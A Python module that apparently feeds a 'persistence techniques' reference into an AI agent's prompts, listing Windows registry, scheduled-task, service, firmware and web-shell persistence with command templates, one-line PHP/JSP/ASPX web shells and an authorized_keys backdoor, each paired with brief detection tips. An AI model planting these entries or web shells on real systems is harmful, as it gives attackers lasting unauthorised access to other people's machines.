"""Persistence techniques knowledge base.

Deep knowledge about persistence mechanisms:
1. Registry and startup persistence (Windows)
2. Scheduled tasks and cron jobs
3. Service and daemon persistence
4. Boot and firmware persistence
5. Web shell and implant persistence
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

import structlog

logger = structlog.get_logger()


@dataclass
class PersistencePattern:
    """A persistence technique pattern."""
    pattern_id: str = ""
    name: str = ""
    category: str = ""
    severity: str = "critical"
    description: str = ""
    detection_strategy: str = ""
    tools: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.pattern_id,
            "name": self.name[:25],
            "category": self.category[:12],
        }


PERSISTENCE_PATTERNS: list[dict[str, Any]] = [
    {
        "id": "pers-001", "name": "Registry and Startup",
        "category": "registry", "severity": "critical",
        "desc": "Windows registry and startup folder persistence.",
        "detection": (
            "REGISTRY AND STARTUP PERSISTENCE:\n"
            "RUN KEYS:\n"
            "  HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n"
            "  HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n"
            "  HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n"
            "  # reg add HKCU\\...\\Run /v name /t REG_SZ /d payload.exe\n"
            "STARTUP FOLDER:\n"
            "  %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\n"
            "  C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\n"
            "WINLOGON:\n"
            "  HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\n"
            "  # Userinit: C:\\Windows\\system32\\userinit.exe,payload.exe\n"
            "  # Shell: explorer.exe,payload.exe\n"
            "IMAGE FILE EXECUTION OPTIONS (IFEO):\n"
            "  HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\<target.exe>\n"
            "  # Debugger = payload.exe\n"
            "  # SilentProcessExit monitoring\n"
            "COM HIJACKING:\n"
            "  # Replace legitimate COM objects\n"
            "  HKCU\\SOFTWARE\\Classes\\CLSID\\{GUID}\\InprocServer32\n"
            "  # Default = payload.dll\n"
            "APPINIT_DLLS:\n"
            "  HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\n"
            "  # AppInit_DLLs = payload.dll\n"
            "DETECTION:\n"
            "  autoruns.exe  # Sysinternals\n"
            "  reg query HKLM\\...\\Run"
        ),
        "tools": ["autoruns"],
    },
    {
        "id": "pers-002", "name": "Scheduled Tasks and Cron",
        "category": "scheduled", "severity": "critical",
        "desc": "Scheduled task and cron job persistence.",
        "detection": (
            "SCHEDULED TASKS AND CRON:\n"
            "WINDOWS SCHEDULED TASKS:\n"
            "  schtasks /create /tn name /tr payload.exe /sc ONLOGON\n"
            "  schtasks /create /tn name /tr payload.exe /sc ONIDLE /i 5\n"
            "  schtasks /create /tn name /tr payload.exe /sc MINUTE /mo 10\n"
            "  # Hidden tasks: XML manipulation\n"
            "  # Security descriptor modification\n"
            "LINUX CRON:\n"
            "  crontab -e\n"
            "  */5 * * * * /path/to/payload\n"
            "  @reboot /path/to/payload\n"
            "  # System cron: /etc/crontab, /etc/cron.d/\n"
            "  # User cron: /var/spool/cron/crontabs/\n"
            "AT JOBS:\n"
            "  at 12:00 /every:M,T,W,Th,F payload.exe\n"
            "  at -f /path/to/payload now + 1 minute\n"
            "SYSTEMD TIMERS:\n"
            "  # Create a .timer unit file\n"
            "  [Timer]\n"
            "  OnBootSec=5min\n"
            "  OnUnitActiveSec=10min\n"
            "  [Install]\n"
            "  WantedBy=timers.target\n"
            "DETECTION:\n"
            "  schtasks /query /fo LIST /v  # Windows\n"
            "  crontab -l  # Linux user cron\n"
            "  ls /etc/cron.d/ /etc/cron.daily/  # System cron\n"
            "  systemctl list-timers  # Systemd"
        ),
        "tools": [],
    },
    {
        "id": "pers-003", "name": "Service and Daemon",
        "category": "service", "severity": "critical",
        "desc": "Service and daemon-based persistence.",
        "detection": (
            "SERVICE AND DAEMON PERSISTENCE:\n"
            "WINDOWS SERVICES:\n"
            "  sc create svcname binpath= payload.exe start= auto\n"
            "  # Modify existing service\n"
            "  sc config svcname binpath= payload.exe\n"
            "  # DLL hijacking in service DLL search\n"
            "  # Service failure recovery: run payload on crash\n"
            "LINUX SYSTEMD:\n"
            "  # Create service unit\n"
            "  [Unit]\n"
            "  Description=Persistence\n"
            "  [Service]\n"
            "  ExecStart=/path/to/payload\n"
            "  Restart=always\n"
            "  [Install]\n"
            "  WantedBy=multi-user.target\n"
            "  # systemctl enable payload.service\n"
            "INIT.D:\n"
            "  # /etc/init.d/payload\n"
            "  # update-rc.d payload defaults\n"
            "LAUNCHD (macOS):\n"
            "  # ~/Library/LaunchAgents/com.payload.plist\n"
            "  # /Library/LaunchDaemons/com.payload.plist\n"
            "  launchctl load com.payload.plist\n"
            "WMI EVENTS:\n"
            "  # WMI event subscription persistence\n"
            "  # Filter + Consumer + Binding\n"
            "  # Triggers on user logon, process start, etc.\n"
            "DETECTION:\n"
            "  sc query state= all  # Windows services\n"
            "  systemctl list-unit-files  # Systemd\n"
            "  launchctl list  # macOS"
        ),
        "tools": [],
    },
    {
        "id": "pers-004", "name": "Boot and Firmware",
        "category": "firmware", "severity": "critical",
        "desc": "Boot and firmware level persistence.",
        "detection": (
            "BOOT AND FIRMWARE PERSISTENCE:\n"
            "UEFI:\n"
            "  - Firmware implants (survive OS reinstall)\n"
            "  - EFI System Partition modification\n"
            "  - Boot manager replacement\n"
            "  - DXE driver injection\n"
            "  - SPI flash modification\n"
            "BOOTKITS:\n"
            "  - MBR modification\n"
            "  - VBR modification\n"
            "  - Boot manager hooking\n"
            "  - Kernel load hijacking\n"
            "  - Known: BlackLotus, ESPecter, MosaicRegressor\n"
            "BIOS/BMC:\n"
            "  - BIOS rootkits\n"
            "  - BMC (Baseboard Management Controller) implants\n"
            "  - Intel ME (Management Engine) exploitation\n"
            "  - AMD PSP exploitation\n"
            "DEVICE FIRMWARE:\n"
            "  - NIC firmware implants\n"
            "  - HDD/SSD firmware (Equation Group)\n"
            "  - GPU firmware\n"
            "  - USB firmware (BadUSB)\n"
            "  - Keyboard/mouse firmware\n"
            "DETECTION:\n"
            "  - CHIPSEC framework\n"
            "  - UEFITool\n"
            "  - Secure Boot verification\n"
            "  - TPM measurements\n"
            "  - Firmware integrity checking"
        ),
        "tools": ["chipsec", "uefitool"],
    },
    {
        "id": "pers-005", "name": "Web Shell and Implant",
        "category": "webshell", "severity": "critical",
        "desc": "Web shell and application-level persistence.",
        "detection": (
            "WEB SHELL AND IMPLANT PERSISTENCE:\n"
            "WEB SHELLS:\n"
            "  # PHP\n"
            "  <?php system($_GET['cmd']); ?>\n"
            "  # JSP\n"
            "  <%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>\n"
            "  # ASPX\n"
            "  <%@ Page Language=\"C#\"%><%System.Diagnostics.Process.Start(\"cmd\",...);%>\n"
            "  # Obfuscated: encoded, encrypted, polymorphic\n"
            "MEMORY-RESIDENT:\n"
            "  - Process injection (DLL injection, process hollowing)\n"
            "  - Reflective DLL loading\n"
            "  - .NET assembly loading (execute-assembly)\n"
            "  - Fileless malware (PowerShell, WMI)\n"
            "  - Living-off-the-land\n"
            "APPLICATION BACKDOORS:\n"
            "  - Modified legitimate applications\n"
            "  - Trojanized updates\n"
            "  - Plugin/extension backdoors\n"
            "  - Modified authentication modules (PAM, IIS)\n"
            "SSH:\n"
            "  # Authorized keys\n"
            "  echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys\n"
            "  # SSH config modification\n"
            "  # PAM backdoor\n"
            "DETECTION:\n"
            "  # Web shell detection\n"
            "  find /var/www -name '*.php' -newer /var/www/index.php\n"
            "  # Process monitoring\n"
            "  # File integrity monitoring (AIDE, OSSEC)\n"
            "  # Memory forensics (Volatility)"
        ),
        "tools": ["volatility"],
    },
]


class PersistenceKB:
    """Persistence techniques knowledge base.

    Provides persistence technique patterns
    injected into agent prompts.
    """

    def __init__(self) -> None:
        self._patterns: dict[str, PersistencePattern] = {}
        self._log = logger.bind(component="persistence_kb")
        self._load_patterns()

    def _load_patterns(self) -> None:
        """Load persistence patterns."""
        for data in PERSISTENCE_PATTERNS:
            pattern = PersistencePattern(
                pattern_id=data["id"],
                name=data["name"],
                category=data.get("category", ""),
                severity=data.get("severity", "critical"),
                description=data.get("desc", ""),
                detection_strategy=data.get("detection", ""),
                tools=data.get("tools", []),
            )
            self._patterns[pattern.pattern_id] = pattern

    def get_by_category(self, category: str) -> list[PersistencePattern]:
        """Get patterns by category."""
        return [
            p for p in self._patterns.values()
            if p.category.lower() == category.lower()
        ]

    def build_persistence_prompt(
        self,
        categories: list[str] | None = None,
        max_patterns: int = 4,
    ) -> str:
        """Build persistence prompt."""
        lines = ["## Persistence Techniques\n"]
        count = 0
        for pattern in self._patterns.values():
            if categories and pattern.category.lower() not in [c.lower() for c in categories]:
                continue
            if count >= max_patterns:
                break
            lines.append(f"### {pattern.name} [{pattern.category.upper()}]")
            lines.append(pattern.detection_strategy)
            lines.append("")
            count += 1
        return "\n".join(lines)

    def get_stats(self) -> dict[str, Any]:
        cat_counts: dict[str, int] = {}
        for p in self._patterns.values():
            cat_counts[p.category] = cat_counts.get(p.category, 0) + 1
        return {
            "patterns": len(self._patterns),
            "by_category": cat_counts,
        }
